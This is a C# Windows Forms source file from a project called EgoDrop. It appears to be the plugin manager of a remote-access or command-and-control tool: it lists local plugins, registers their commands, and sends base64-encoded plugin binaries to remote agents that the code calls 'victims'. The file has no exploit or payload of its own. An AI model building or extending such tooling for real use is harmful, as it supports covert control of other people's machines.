using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmPluginMgr : Form
    {
        private frmMain m_frmMain { get; init; }
        private clsAgent m_agent { get; init; }
        private string m_szPluginDir { get { return Path.Combine(Application.StartupPath, "Plugins"); } }

        public frmPluginMgr(frmMain frmMain, clsAgent agent)
        {
            InitializeComponent();

            m_frmMain = frmMain;
            m_agent = agent;
        }

        clsPlugin.stPluginInfo fnGetPluginInfoFromTag(ListViewItem item) => item.Tag == null ? new clsPlugin.stPluginInfo() : (clsPlugin.stPluginInfo)item.Tag;
        void fnSetAbiVersion(ListViewItem item, string szVersion) => item.SubItems[2].Text = szVersion;
        void fnSetLoadStatus(ListViewItem item, string szStatus) => item.SubItems[4].Text = szStatus;

        void fnRecv(clsListener listener, clsVictim victim, string szVictimID, List<string> lsMsg)
        {
            Invoke(new Action(() =>
            {
                if (lsMsg[0] == "plugin")
                {
                    if (lsMsg[1] == "ls")
                    {
                        var l2d = clsEZData.fn2dLB64Decode(lsMsg[2], "|");
                        List<string> lsLoadedPlugin = new List<string>();

                        foreach (var s in l2d)
                        {
                            string szName = s[0];
                            if (string.IsNullOrEmpty(szName))
                                continue;

                            string szPluginVersion = s[1];
                            string szAbiVersion = s[2];
                            string szDescription = s[3];

                            ListViewItem? item = listView1.FindItemWithText(szName, true, 0);
                            if (item == null)
                            {
                                DialogResult dr = MessageBox.Show(
                                    $"Detect unexpected plugin[{szName}], which is not in the list, do you want to show it?",
                                    "Unexpected plugin.",
                                    MessageBoxButtons.YesNo,
                                    MessageBoxIcon.Question,
                                    MessageBoxDefaultButton.Button1
                                );

                                if (dr != DialogResult.Yes)
                                    continue;

                                ListViewItem itemNewPlugin = new ListViewItem(szName);
                                itemNewPlugin.SubItems.Add(szName);
                                itemNewPlugin.SubItems.Add(szAbiVersion);
                                itemNewPlugin.SubItems.Add(szPluginVersion);
                                itemNewPlugin.SubItems.Add("Loaded"); //Status
                                itemNewPlugin.SubItems.Add("-");
                                itemNewPlugin.SubItems.Add(szDescription);

                                listView1.Items.Add(itemNewPlugin);
                            }
                            else
                            {
                                item.SubItems[2].Text = szAbiVersion;
                                item.SubItems[3].Text = szPluginVersion;
                            }

                            lsLoadedPlugin.Add(szName);
                        }

                        List<ListViewItem> lsUnloaded = new List<ListViewItem>();
                        List<ListViewItem> lsPlugin = listView1.Items.Cast<ListViewItem>().ToList();

                        lsUnloaded.AddRange(lsPlugin.Where(x => !lsLoadedPlugin.Contains(x.SubItems[1].Text)));
                        if (lsUnloaded.Count > 0)
                        {
                            foreach (var item in lsUnloaded)
                                item.SubItems[4].Text = "Unloaded";
                        }
                    }
                    else if (lsMsg[1] == "load")
                    {
                        int nCode = int.Parse(lsMsg[2]);
                        string szName = lsMsg[3];
                        if (nCode == 1)
                        {
                            uint uAbiVersion = uint.Parse(lsMsg[4]);
                            uint uVersion = uint.Parse(lsMsg[5]);
                            string szDescription = lsMsg[6];

                            ListViewItem item = listView1.FindItemWithText(szName, true, 0);
                            if (item == null)
                            {
                                MessageBox.Show($"Cannot find plugin[{szName}]", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return;
                            }

                            fnSetAbiVersion(item, uAbiVersion.ToString());
                            fnSetLoadStatus(item, "Loaded");

                            m_frmMain.fnSysLogOK($"Load plugin successfully(Name={szName}, Version={uVersion}, AbiVersion={uAbiVersion}, Description={szDescription})");
                        }
                        else
                        {
                            m_frmMain.fnSysLogErr($"Load plugin[{szName}] failed.");
                        }
                    }
                    else if (lsMsg[1] == "unload")
                    {

                    }
                    else if (lsMsg[1] == "clear")
                    {
                        int nCode = int.Parse(lsMsg[2]);
                        string szMsg = lsMsg[3];

                        if (nCode == 0)
                        {
                            MessageBox.Show(szMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }
                    }
                    else if (lsMsg[1] == "remove")
                    {

                    }
                    else if (lsMsg[1] == "output")
                    {
                        //MessageBox.Show(lsMsg[2]);
                    }
                }
            }));
        }

        /// <summary>
        /// Display all plugins from the local folder.
        /// </summary>
        void fnLoadAllPlugin()
        {
            if (!Directory.Exists(m_szPluginDir))
            {
                MessageBox.Show("Cannot find plugin directory: " + m_szPluginDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            foreach (string szFilePath in Directory.GetFiles(m_szPluginDir))
            {
                if (string.Equals(Path.GetExtension(szFilePath).Trim('.'), "json"))
                    continue;

                string szName = Path.GetFileNameWithoutExtension(szFilePath);
                string szJsonFile = Path.Combine(Path.GetDirectoryName(szFilePath), $"{szName}.json");

                var szJsonText = File.ReadAllText(szJsonFile);
                var meta = JsonSerializer.Deserialize<clsPlugin.stPluginMeta>(szJsonText);
                if (meta.bIsNull)
                {
                    m_frmMain.fnSysLogErr($"Read metadata error: Plugin=[{szName}], Path=[{szFilePath}]");
                    continue;
                }

                ListViewItem item = new ListViewItem(szName);
                item.SubItems.Add(meta.Name);
                item.SubItems.Add("-"); //ABI version.
                item.SubItems.Add(meta.Version);
                item.SubItems.Add("Unknown"); //Status.
                item.SubItems.Add("-"); //Loaded date.
                item.SubItems.Add(meta.Description);

                var info = new clsPlugin.stPluginInfo()
                {
                    szFileName = szFilePath,
                    Meta = meta,
                };

                item.Tag = info;

                listView1.Items.Add(item);

                m_frmMain.fnSysLogInfo($"Discovered plugin[{szName}]");

                var list = new List<clsPlugin.stCommandSpec>();
                foreach (var cmd in meta.command)
                {
                    list.Add(new clsPlugin.stCommandSpec()
                    {
                        PluginName = meta.Name,
                        Entry = meta.Entry,
                        Command = cmd.name,
                        Args = cmd.args,
                        Description = cmd.desc,
                    });
                }

                if (!m_agent.m_dicCommandRegistry.ContainsKey(meta.Entry))
                {
                    m_agent.m_dicCommandRegistry[meta.Entry] = list;
                    m_frmMain.fnSysLogInfo($"Register command successfully: (Agent={m_agent.m_szVictimID}, Command={meta.Entry})");
                }
            }
        }

        void fnSetup()
        {
            m_agent.m_victim.m_listener.evtReceivedMessage += fnRecv;

            fnLoadAllPlugin();

            toolStripStatusLabel1.Text = $"Plugin[{listView1.Items.Count}]";

            m_agent.fnSendCommand(new string[]
            {
                "plugin",
                "ls",
            });
        }

        private void frmPluginMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmPluginMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_agent.m_victim.m_listener.evtReceivedMessage -= fnRecv;
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
            {
                var info = fnGetPluginInfoFromTag(item);
                m_agent.fnSendCommand(new string[]
                {
                    "plugin",
                    "load",
                    info.Meta.Name,
                    Convert.ToBase64String(info.fnabPluginBuffer()),
                });
            }
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
            {

            }
        }
    }
}
